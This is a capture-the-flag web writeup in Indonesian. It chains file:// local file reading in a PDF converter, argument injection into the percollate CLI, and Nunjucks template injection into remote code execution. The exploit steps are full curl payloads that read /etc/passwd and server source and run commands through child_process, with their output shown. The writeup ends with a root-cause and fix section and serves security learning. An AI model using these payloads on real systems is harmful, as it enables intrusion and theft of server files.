# Farewell, #include — Web CTF Writeup

**CTF:** No Hack No CTF 2026  
**Category:** Web  
**Challenge:** Farewell, #include  
**Difficulty:** Hard  
**Flag:** `NHNC{Farewell, my friend, promise me you won't find another 0days next time._>>bea31b7037134741939ff9984c9217ce}`

## Deskripsi

> more features this time...  
> but it’s absolutely not that easy.  
> execute `/readflag` to know how to get the flag.
>
> you may have already noticed that you can obtain some useful information using the method from the previous challenge.
>
> For this challenge, you can reuse that approach to gather information. It is recommended that you analyze everything locally first and confirm that you can achieve RCE before u restart again the instancer.

Aplikasi menyediakan tiga converter:

- `standard-pdf`
- `lite-pdf`
- `markdown-pdf`

Input URL dikirim ke endpoint `POST /convert`.

## Recon

Frontend hanya membatasi URL dengan regex `^https?://`, tetapi pengecekan itu berjalan di browser. Request dapat dikirim langsung ke endpoint `/convert` menggunakan DevTools atau `curl`.

Request dasar:

```bash
curl -sS -X POST 'http://TARGET/convert' \
  --data-urlencode 'converter=standard-pdf' \
  --data-urlencode 'url=file:///etc/passwd' \
  -o output.pdf
```

PDF kemudian diekstrak dengan:

```bash
pdftotext -layout output.pdf -
```

`standard-pdf` masih menerima skema `file://`, sehingga file lokal yang dapat dibaca Chromium bisa dirender menjadi PDF.

## Membaca Source Code

Path `/proc/1/cwd` mengarah ke working directory proses utama container. File berikut berhasil dibaca:

```text
file:///proc/1/cwd/package.json
file:///proc/1/cwd/package-lock.json
file:///proc/1/cwd/server.js
```

`package.json` menunjukkan dependency lokal:

```json
{
  "dependencies": {
    "express": "^4.19.2",
    "html-pdf-node": "file:../lib/html-pdf-node",
    "mdpdf": "file:../lib/mdpdf"
  }
}
```

Bagian penting di `server.js`:

```js
function run_percollate(user_input) {
    return new Promise(resolve => {
        const job = create_job('lite-pdf');
        const urls = getallurl(user_input);
        const args = [
            'pdf',
            '--no-sandbox',
            '--output',
            path.resolve(job.output_path),
            ...urls
        ];

        const child = spawn(process.execPath, [percollate_cli, ...args], {
            cwd: work_dir,
            stdio: ['ignore', 'ignore', 'ignore']
        });
    });
}
```

`getallurl()` memecah input berdasarkan whitespace:

```js
function getallurl(input) {
    return String(input || '')
        .trim()
        .split(/\s+/)
        .filter(Boolean);
}
```

Karena seluruh token input ditempel langsung ke argumen CLI `percollate`, input yang diawali `--title=`, `--template=`, dan opsi lain diperlakukan sebagai argumen program, bukan URL.

Ini adalah argument injection.

## Analisis Percollate

Source berikut dibaca lewat LFI:

```text
file:///app/lib/percollate/cli.js
file:///app/lib/percollate/src/cli-opts.js
file:///app/lib/percollate/index.js
file:///app/lib/percollate/templates/default.html
```

Parser CLI menerima bentuk:

```text
--option=value
```

Opsi yang relevan:

```text
--template=<path>
--title=<title>
--style=<path>
--css=<style>
```

Pada proses pembuatan PDF, template dirender dengan Nunjucks:

```js
const html = nunjucks.renderString(
    await readFile(options.template || DEFAULT_TEMPLATE, 'utf8'),
    {
        filetype: 'pdf',
        title,
        author,
        date: new Date(),
        items,
        style,
        options: {
            use_toc,
            use_cover
        }
    }
);
```

Nilai `title` dikontrol user melalui `--title=...`.

Dengan template yang memuat `{{ title }}`, ekspresi Nunjucks di dalam nilai title dapat dievaluasi. Payload berikut membuktikan SSTI:

```text
{{range.constructor("return(globalThis.process.version)")()}}
```

Hasil PDF menampilkan versi Node:

```text
v20.20.2
```

Chain yang didapat:

```text
LFI
→ baca source backend
→ argument injection pada lite-pdf
→ Nunjucks SSTI
→ akses Function constructor
→ akses globalThis.process
→ child_process
→ RCE
```

## Validasi RCE

RCE diuji dengan menjalankan `/usr/bin/id`:

```bash
curl -sS -X POST 'http://TARGET/convert' \
  --data-urlencode 'converter=lite-pdf' \
  --data-urlencode "url=--template=/proc/self/cmdline --title={{range.constructor(\"return(globalThis.process.getBuiltinModule('child_process').execFileSync('/usr/bin/id').toString())\")()}} file:///etc/hostname" \
  -o /tmp/id.pdf &&
pdftotext -layout /tmp/id.pdf -
```

Output:

```text
uid=1337(ctf) gid=1337(ctf) groups=1337(ctf)
```

`/proc/self/cmdline` dipakai sebagai template agar seluruh command line proses muncul dalam PDF. Nilai hasil SSTI masuk ke argumen `--title`, sehingga stdout command ikut terlihat.

## Menjalankan `/readflag`

Menjalankan `/readflag` tanpa argumen menghasilkan:

```text
Usage: /readflag give me the flag
```

Program tersebut mengharuskan empat argumen literal:

```text
give
me
the
flag
```

Payload final:

```bash
curl -sS -X POST 'http://TARGET/convert' \
  --data-urlencode 'converter=lite-pdf' \
  --data-urlencode "url=--template=/proc/self/cmdline --title={{range.constructor(\"return(globalThis.process.getBuiltinModule('child_process').execFileSync('/readflag',['give','me','the','flag']).toString())\")()}} file:///etc/hostname" \
  -o /tmp/flag.pdf &&
pdftotext -layout /tmp/flag.pdf -
```

Output PDF:

```text
--title=NHNC{Farewell, my friend, promise me you won't find another
0days next time._>>bea31b7037134741939ff9984c9217ce}
```

Line break berasal dari wrapping teks PDF. Flag aslinya satu baris.

## Flag

```text
NHNC{Farewell, my friend, promise me you won't find another 0days next time._>>bea31b7037134741939ff9984c9217ce}
```

## Root Cause

Ada tiga masalah yang saling tersambung:

1. `standard-pdf` menerima `file://`, sehingga arbitrary local file read dapat dilakukan.
2. Input `lite-pdf` dipecah berdasarkan whitespace lalu diteruskan langsung sebagai argumen CLI.
3. Nilai `--title` dirender oleh Nunjucks dan dapat mencapai `Function` constructor.

Fix yang masuk akal:

- Tolak seluruh skema selain `http:` dan `https:` di backend.
- Jangan menerima argumen CLI mentah dari user.
- Gunakan `--` sebelum operand jika CLI mendukungnya.
- Validasi setiap URL setelah parsing.
- Hindari merender string terkontrol user sebagai template.
- Jalankan Chromium dan child process dengan sandbox serta hak akses minimum.
